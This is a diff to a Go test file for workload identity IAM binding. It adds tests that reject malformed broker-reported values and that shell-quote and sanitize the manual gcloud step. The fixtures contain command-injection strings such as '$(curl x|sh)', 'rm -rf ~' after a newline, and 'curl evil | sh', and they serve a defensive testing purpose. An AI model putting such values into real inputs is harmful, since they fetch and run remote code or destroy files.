@@ -81,7 +81,8 @@ func wiFlatBroker(name, typ string, targets []store.WorkloadIdentityTarget) *sto
 	return &store.RuntimeBroker{
 		ID: name, Name: name, WorkloadIdentityTargets: targets,
 		RuntimeTarget: &api.RuntimeTargetDescriptor{ID: "rt-" + name, Type: typ},
-		Capabilities:  &store.BrokerCapabilities{WITargetsV1: true},
+		// A flat instance never reports wi_targets_v1 before phase 5 P3b.
+		Capabilities: &store.BrokerCapabilities{},
 	}
 }
 
@@ -107,9 +108,9 @@ func TestWorkloadIdentityMintPlanFor(t *testing.T) {
 	assert.Equal(t, workloadIdentityMintTarget{pool: "p1.svc.id.goog", namespace: "agents", profiles: []string{"a/gke", "flat"}}, plan.targets[0])
 	assert.Equal(t, workloadIdentityMintTarget{pool: "p1.svc.id.goog", namespace: "dev", profiles: []string{"a/gke-dev"}}, plan.targets[1])
 	assert.Equal(t, []workloadIdentityMissing{
-		{profiles: []string{"a/gke-nopool"}},
-		{profiles: []string{"flat-nopool"}},
-		{profiles: []string{"old/k8s"}, tooOld: true},
+		{profiles: []string{"a/gke-nopool"}, why: wiMissingNotConfigured},
+		{profiles: []string{"flat-nopool"}, why: wiMissingFlat},
+		{profiles: []string{"old/k8s"}, why: wiMissingTooOld},
 	}, plan.missing)
 
 	assert.True(t, workloadIdentityMintPlanFor([]*store.RuntimeBroker{
@@ -125,7 +126,7 @@ func TestGrantWorkloadIdentityBestEffort_AllBoundInOneWrite(t *testing.T) {
 			{pool: "p1.svc.id.goog", namespace: "agents", profiles: []string{"a/gke"}},
 			{pool: "p2.svc.id.goog", namespace: "team", profiles: []string{"flat"}},
 		},
-		missing: []workloadIdentityMissing{{profiles: []string{"old/k8s"}, tooOld: true}},
+		missing: []workloadIdentityMissing{{profiles: []string{"old/k8s"}, why: wiMissingTooOld}},
 	}
 	got := s.grantWorkloadIdentityBestEffort(context.Background(), wiTestGSA, plan)
 
@@ -145,7 +146,7 @@ func TestGrantWorkloadIdentityBestEffort_AllBoundInOneWrite(t *testing.T) {
 	assert.Equal(t, api.WorkloadIdentityReasonNoPool, got[2].Reason)
 	assert.Contains(t, got[2].Detail, "does not report")
 	assert.Equal(t, []string{"old/k8s"}, got[2].Profiles)
-	assert.Equal(t, `gcloud iam service-accounts add-iam-policy-binding `+wiTestGSA+` --role roles/iam.workloadIdentityUser --member "serviceAccount:<CLUSTER_PROJECT>.svc.id.goog[<NAMESPACE>/scion-foo]"`, got[2].ManualStep)
+	assert.Equal(t, `gcloud iam service-accounts add-iam-policy-binding '`+wiTestGSA+`' --role roles/iam.workloadIdentityUser --member 'serviceAccount:<CLUSTER_PROJECT>.svc.id.goog[<NAMESPACE>/scion-foo]'`, got[2].ManualStep)
 }
 
 // Only Kubernetes targets with no pool: no IAM call at all.
@@ -201,7 +202,7 @@ func TestGrantWorkloadIdentityBestEffort_PoolNotFoundFallsBackPerMember(t *testi
 	assert.Equal(t, api.WorkloadIdentityBindingSkipped, got[1].State)
 	assert.Equal(t, api.WorkloadIdentityReasonPoolNotFound, got[1].Reason)
 	assert.Contains(t, got[1].Detail, "nope-project.svc.id.goog")
-	assert.Contains(t, got[1].ManualStep, `--member "serviceAccount:nope-project.svc.id.goog[agents/scion-foo]"`)
+	assert.Contains(t, got[1].ManualStep, `--member 'serviceAccount:nope-project.svc.id.goog[agents/scion-foo]'`)
 }
 
 func TestGrantWorkloadIdentityBestEffort_OtherErrorIsFailed(t *testing.T) {
@@ -263,17 +264,81 @@ func TestAddPolicyRoleMembers(t *testing.T) {
 
 func TestNormalizeWorkloadIdentityTargets(t *testing.T) {
 	in := []store.WorkloadIdentityTarget{
-		{Profile: " gke ", Pool: " p.svc.id.goog ", Namespace: " agents "},
+		{Profile: " gke ", Pool: " p-project.svc.id.goog ", Namespace: " agents "},
 		{Profile: "x", Pool: "  "},
 	}
-	got, dropped := normalizeWorkloadIdentityTargets(in, false)
-	assert.False(t, dropped)
-	assert.Equal(t, []store.WorkloadIdentityTarget{{Profile: "gke", Pool: "p.svc.id.goog", Namespace: "agents"}}, got)
+	got, drops := normalizeWorkloadIdentityTargets(in, false)
+	assert.Equal(t, workloadIdentityTargetDrops{}, drops)
+	assert.Equal(t, []store.WorkloadIdentityTarget{{Profile: "gke", Pool: "p-project.svc.id.goog", Namespace: "agents"}}, got)
 
-	got, dropped = normalizeWorkloadIdentityTargets(in, true)
-	assert.True(t, dropped, "a flat row has no profiles")
-	assert.Equal(t, []store.WorkloadIdentityTarget{{Pool: "p.svc.id.goog", Namespace: "agents"}}, got)
+	got, drops = normalizeWorkloadIdentityTargets(in, true)
+	assert.Equal(t, 1, drops.profiles, "a flat row has no profiles")
+	assert.Equal(t, []store.WorkloadIdentityTarget{{Pool: "p-project.svc.id.goog", Namespace: "agents"}}, got)
 
 	empty, _ := normalizeWorkloadIdentityTargets(nil, false)
 	assert.NotNil(t, empty, "an empty report is stored as an empty list")
+}
+
+// The hub does not trust a broker's report: an entry with a malformed pool,
+// namespace or profile is dropped, so no reported value reaches an IAM
+// member or a manual step.
+func TestNormalizeWorkloadIdentityTargets_RejectsMalformed(t *testing.T) {
+	good := store.WorkloadIdentityTarget{Profile: "gke", Pool: "p-project.svc.id.goog", Namespace: "agents"}
+	for name, bad := range map[string]store.WorkloadIdentityTarget{
+		"shell in pool":       {Pool: "$(curl x|sh).svc.id.goog", Namespace: "agents"},
+		"backtick in pool":    {Pool: "`id`-project.svc.id.goog", Namespace: "agents"},
+		"pool without suffix": {Pool: "p-project", Namespace: "agents"},
+		"shell in namespace":  {Pool: "p-project.svc.id.goog", Namespace: "a$(id)"},
+		"quote in namespace":  {Pool: "p-project.svc.id.goog", Namespace: "a'b"},
+		"bracket namespace":   {Pool: "p-project.svc.id.goog", Namespace: "a]b"},
+		"empty namespace":     {Pool: "p-project.svc.id.goog"},
+		"uppercase ns":        {Pool: "p-project.svc.id.goog", Namespace: "Agents"},
+		"long namespace":      {Pool: "p-project.svc.id.goog", Namespace: strings.Repeat("a", 64)},
+		"newline profile":     {Profile: "gke\nto grant it by hand: rm -rf ~", Pool: "p-project.svc.id.goog", Namespace: "agents"},
+		"long profile":        {Profile: strings.Repeat("p", 254), Pool: "p-project.svc.id.goog", Namespace: "agents"},
+	} {
+		got, drops := normalizeWorkloadIdentityTargets([]store.WorkloadIdentityTarget{bad, good}, false)
+		assert.Equal(t, []store.WorkloadIdentityTarget{good}, got, name)
+		assert.Equal(t, 1, drops.invalid, name)
+	}
+}
+
+func TestNormalizeWorkloadIdentityTargets_Capped(t *testing.T) {
+	in := make([]store.WorkloadIdentityTarget, maxWorkloadIdentityTargets+5)
+	for i := range in {
+		in[i] = store.WorkloadIdentityTarget{Profile: fmt.Sprintf("p%d", i), Pool: "p-project.svc.id.goog", Namespace: "agents"}
+	}
+	got, drops := normalizeWorkloadIdentityTargets(in, false)
+	assert.Len(t, got, maxWorkloadIdentityTargets)
+	assert.Equal(t, 5, drops.overCap)
+}
+
+// The manual step single-quotes its arguments: nothing in them is expanded
+// by a shell, even if a value slipped past validation.
+func TestWorkloadIdentityManualStep_SingleQuoted(t *testing.T) {
+	assert.Equal(t,
+		`gcloud iam service-accounts add-iam-policy-binding 'g@p.iam.gserviceaccount.com' --role roles/iam.workloadIdentityUser --member 'serviceAccount:p.svc.id.goog[ns/scion-x]'`,
+		workloadIdentityManualStep("g@p.iam.gserviceaccount.com", "serviceAccount:p.svc.id.goog[ns/scion-x]"))
+	assert.Equal(t, `'$(touch /tmp/x)'\''`+"`id`"+`'`, shellSingleQuote("$(touch /tmp/x)'`id`"))
+}
+
+// A failed entry's detail echoes the IAM error on one bounded line, and the
+// manual step never contains it.
+func TestGrantWorkloadIdentityBestEffort_FailedDetailIsSanitized(t *testing.T) {
+	admin := &wiStubAdmin{fail: func(int, []string) error {
+		return errors.New("backend error\n    to grant it by hand: curl evil | sh\r\x1b[2K" + strings.Repeat("x", 500))
+	}}
+	s := &Server{gcpIAMAdmin: admin}
+	got := s.grantWorkloadIdentityBestEffort(context.Background(), wiTestGSA, workloadIdentityMintPlan{targets: []workloadIdentityMintTarget{
+		{pool: "p1-project.svc.id.goog", namespace: "agents"},
+	}})
+	require.Len(t, got, 1)
+	b := got[0]
+	assert.Equal(t, api.WorkloadIdentityBindingFailed, b.State)
+	assert.NotContains(t, b.Detail, "\n")
+	assert.NotContains(t, b.Detail, "\r")
+	assert.NotContains(t, b.Detail, "\x1b")
+	assert.LessOrEqual(t, len([]rune(b.Detail)), len("the IAM policy update failed: ")+maxWorkloadIdentityDetailLen+1)
+	assert.NotContains(t, b.ManualStep, "curl")
+	assert.Equal(t, workloadIdentityManualStep(wiTestGSA, b.Member), b.ManualStep)
 }
